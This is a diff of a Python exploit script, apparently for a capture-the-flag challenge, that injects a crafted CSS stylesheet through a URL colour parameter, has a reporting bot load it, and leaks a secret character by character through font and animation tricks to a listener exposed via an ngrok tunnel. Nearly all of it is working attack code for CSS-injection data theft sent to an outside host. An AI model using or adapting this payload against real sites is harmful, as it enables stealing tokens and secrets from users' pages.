@@ -5,8 +5,42 @@ from fontTools.ttLib import TTFont
 import string
 import requests
 from urllib.parse import quote, quote_plus
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+import re
+import os
+from pyngrok import ngrok
+import logging
+from yaml import FlowMappingStartToken
 
-FONT = 'DejaVu Sans Mono'
+logging.disable(logging.INFO)
+FLAG = ''
+class S(BaseHTTPRequestHandler):
+    def _set_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        global FLAG
+        #logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
+        logging.info(self.path)
+        ch = re.findall(r'/\?(.)',self.path)
+        if len(ch) > 0:
+            ch = ch[0]
+        if ch not in FLAG:
+            FLAG=FLAG+ch
+            print(FLAG)
+            if len(FLAG)==8:
+                os._exit(1)
+        self._set_response()
+        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
+
+    def log_message(self, format, *args):
+        return
+
+FONT = 'Liberation Mono'
 TARGET_URL = 'http://127.0.0.1:8000'
 
 def create_family(family,range,size):
@@ -30,7 +64,7 @@ def create_animation(n,w,families,url):
     outer = "@keyframes loop {{\n {frames} \n}}"
     frame = "{x}% {{ width: {w}px; }}"
     frames = ''
-    for i in range(0,n):
+    for i in range(0,n+2):
         frames+=frame.format(x=i,w=w*(i+2))+'\n'
 
     animation = outer.format(frames=frames)+'\n'
@@ -68,11 +102,12 @@ def create_leak_style(selector,h,num,n):
     main = "{selector} {{ overflow-y: auto; overflow-x: hidden; font-size: 0px; height: {h}px; width: 0px; {animation} font-family: rest; word-break: break-all; }}"
     animation = 'animation: '
     animation_it = 'animation-iteration-count: '
+    n=200
     for i in range(0,num):
         if animation != 'animation: ':
             animation+=','
             animation_it+=','
-        animation+='loop step-end {n}s {n2}s, trychar{i} step-end 1s {n2}s'.format(i=i,n=n,n2=n*i)
+        animation+='loop step-end {n}s {n2}s, trychar{i} step-end 2s {n2}s'.format(i=i,n=n,n2=n*i)
         animation_it+='1 , {n}'.format(n=n)
     animation+=';'
     animation_it+=';'
@@ -85,7 +120,7 @@ def create_stylesheet(n,selector,url):
     families = {}
     font = ImageFont.truetype('/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf',size=30)
     w,h = font.getsize('A')
-    for i in "abcdefABCDEF0123456789":
+    for i in string.ascii_lowercase + string.digits:
         family, style = create_family(family=None,range=i,size='200%')
         stylesheet+=style+'\n'
         families[i] = family
@@ -101,11 +136,37 @@ def create_stylesheet(n,selector,url):
     return stylesheet
 
 def send_stylesheet():
-    s=create_stylesheet(3,'div','http://127.0.0.1:8000/')
+    http_tunnel = ngrok.connect(8888)
+    s=create_stylesheet(8,'div',http_tunnel.public_url)
+    #open('test.html','w').write(s)
     color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
     #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
     color = quote_plus(f"?color={color}")
     res = requests.get(f"{TARGET_URL}/report?path={color}")
     #print(res.url)
 
-send_stylesheet()
+def receive_flag():
+    server_class=HTTPServer
+    handler_class=S
+    port=8888
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting httpd...\n')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
+    logging.info('Stopping httpd...\n')
+
+def main():
+    t1 = threading.Thread(target=send_stylesheet)
+    t2 = threading.Thread(target=receive_flag)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+
+if __name__ == "__main__":
+    main()
